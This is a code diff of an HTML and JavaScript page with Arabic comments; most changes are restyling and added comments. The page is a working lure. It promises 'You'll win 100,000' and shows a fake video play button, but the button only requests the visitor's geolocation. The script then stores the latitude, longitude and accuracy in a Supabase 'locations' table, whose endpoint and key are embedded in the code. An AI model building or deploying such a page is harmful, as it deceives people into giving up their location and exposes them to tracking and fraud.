@@ -17,17 +17,18 @@
             min-height: 100vh;
             background: #111;
             font-family: Arial, sans-serif;
+            color: white;
+
             display: flex;
             justify-content: center;
             align-items: center;
+
             padding: 20px;
         }
 
         .page {
             width: 100%;
             max-width: 600px;
-            background: #111;
-            color: white;
             text-align: center;
         }
 
@@ -41,35 +42,61 @@
             margin-bottom: 20px;
         }
 
+        /* مربع الصورة */
+
         .video-preview {
             position: relative;
+
             width: 100%;
             aspect-ratio: 16 / 9;
-            background: linear-gradient(135deg, #222, #444);
+
+            background-image: url("image.jpg");
+            background-size: cover;
+            background-position: center;
+
             border-radius: 12px;
             overflow: hidden;
-            cursor: pointer;
+
             display: flex;
             justify-content: center;
             align-items: center;
+
+            cursor: pointer;
         }
 
-        .video-preview:hover {
-            background: linear-gradient(135deg, #292929, #4d4d4d);
+        /* طبقة خفيفة فوق الصورة */
+
+        .video-preview::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+
+            background: rgba(0, 0, 0, 0.20);
         }
+
+        /* زر التشغيل */
 
         .play-button {
+            position: relative;
+            z-index: 2;
+
             width: 78px;
             height: 78px;
+
             border-radius: 50%;
+
             background: white;
             color: #111;
+
             display: flex;
             align-items: center;
             justify-content: center;
+
             font-size: 36px;
+
             padding-left: 5px;
-            transition: transform 0.2s;
+
+            transition: 0.2s;
         }
 
         .video-preview:hover .play-button {
@@ -78,27 +105,46 @@
 
         .video-label {
             position: absolute;
+
+            z-index: 2;
+
             bottom: 15px;
             left: 0;
             right: 0;
+
             color: white;
+
             font-size: 16px;
+
+            text-shadow: 0 1px 4px #000;
         }
+
+        /* رسالة توضيحية */
 
         .notice {
             margin-top: 18px;
+
             padding: 14px;
+
             background: #222;
+
             border-radius: 10px;
+
             color: #ddd;
+
             line-height: 1.7;
+
             font-size: 14px;
         }
 
+        /* النتيجة */
+
         #result {
             margin-top: 20px;
-            line-height: 2;
+
             min-height: 30px;
+
+            line-height: 2;
         }
 
         .success {
@@ -117,18 +163,21 @@
     </style>
 </head>
 
+
 <body>
 
 <div class="page">
 
-    <h1>You’ll win 100,000</h1>
+    <h1>
+        You’ll win 100,000
+    </h1>
 
     <div class="subtitle">
         Go register your name to be among the winners.
     </div>
 
 
-    <!-- دائرة الفيديو -->
+    <!-- الصورة + زر التشغيل -->
 
     <div
         class="video-preview"
@@ -149,11 +198,15 @@
     </div>
 
 
+    <!-- توضيح للمستخدم -->
+
     <div class="notice">
         To continue, click the play button.
         Your browser will ask for permission to share your location.
     </div>
 
+
+    <!-- نتيجة العملية -->
 
     <div id="result"></div>
 
@@ -167,9 +220,9 @@
 
 <script>
 
-    /* ================================
-       Supabase
-       ================================ */
+    /* =====================================
+       بيانات Supabase
+       ===================================== */
 
     const SUPABASE_URL =
         "https://vsztpvsicsmxjhsvqzbv.supabase.co";
@@ -178,6 +231,10 @@
         "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";
 
 
+    /* =====================================
+       إنشاء اتصال Supabase
+       ===================================== */
+
     const supabaseClient =
         window.supabase.createClient(
             SUPABASE_URL,
@@ -185,9 +242,9 @@
         );
 
 
-    /* ================================
+    /* =====================================
        العناصر
-       ================================ */
+       ===================================== */
 
     const videoButton =
         document.getElementById("videoButton");
@@ -199,9 +256,9 @@
     let processing = false;
 
 
-    /* ================================
-       الضغط على دائرة التشغيل
-       ================================ */
+    /* =====================================
+       الضغط على زر ▶️
+       ===================================== */
 
     videoButton.addEventListener(
         "click",
@@ -209,7 +266,9 @@
     );
 
 
-    /* دعم زر Enter من لوحة المفاتيح */
+    /* =====================================
+       دعم Enter و Space
+       ===================================== */
 
     videoButton.addEventListener(
         "keydown",
@@ -224,13 +283,14 @@
 
                 requestLocation();
             }
+
         }
     );
 
 
-    /* ================================
-       الحصول على الموقع
-       ================================ */
+    /* =====================================
+       طلب الموقع
+       ===================================== */
 
     function requestLocation() {
 
@@ -275,9 +335,9 @@
     }
 
 
-    /* ================================
-       بعد موافقة المستخدم
-       ================================ */
+    /* =====================================
+       نجاح الحصول على الموقع
+       ===================================== */
 
     async function locationSuccess(position) {
 
@@ -303,9 +363,13 @@
                 await supabaseClient
                     .from("locations")
                     .insert({
+
                         latitude: latitude,
+
                         longitude: longitude,
+
                         accuracy: accuracy
+
                     });
 
 
@@ -334,7 +398,9 @@
                 '</span>';
 
 
-        } catch (error) {
+        }
+
+        catch (error) {
 
             console.error(error);
 
@@ -351,9 +417,9 @@
     }
 
 
-    /* ================================
-       أخطاء الموقع
-       ================================ */
+    /* =====================================
+       أخطاء تحديد الموقع
+       ===================================== */
 
     function locationError(error) {
 
@@ -396,6 +462,7 @@
                 '<span class="error">' +
                 'Unable to get your location.' +
                 '</span>';
+
         }
 
 
@@ -405,4 +472,5 @@
 </script>
 
 </body>
+
 </html>
